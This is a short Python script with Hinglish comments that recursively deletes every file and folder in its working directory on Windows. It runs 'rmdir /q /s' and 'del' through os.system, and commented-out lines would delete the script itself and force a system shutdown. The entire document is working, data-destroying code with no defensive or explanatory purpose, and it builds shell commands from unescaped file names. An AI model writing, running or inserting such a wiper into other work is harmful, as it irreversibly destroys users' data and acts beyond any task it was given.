import os

list_dir = os.listdir()
mother_file = "main.py"
directory = os.getcwd()

for i in range(len(list_dir)):

    x = str(list_dir[i])
    path_of_file = f"{directory}\\{x}"
    path_of_file = '"{}"'.format(path_of_file)  # string m space tha uske liye ye double quotes lgane ke liye h

    if list_dir[i] == mother_file:  # mother file last me delete krni h if you wantself distruction
        continue

    if os.path.isdir(x):
        os.system(f"rmdir /q /s {path_of_file}")  # /q /s is the solution to delete tree folders
        # print(f"deleted {path_of_file}")

    if os.path.isfile(x):
        print(x)
        os.system(f"del {path_of_file}")
        # print("deleted type file",path_of_file)

    else:
        # print("dont recomend file")
        continue

# this is to delete the mother file/selfdistruction
#os.system(f"del /f {mother_file}")

# this is to shutdown the system after deleting files you can change time for shuting down
# time_shutdown = 5
# os.system(f"shutdown -s -t {time_shutdown}")
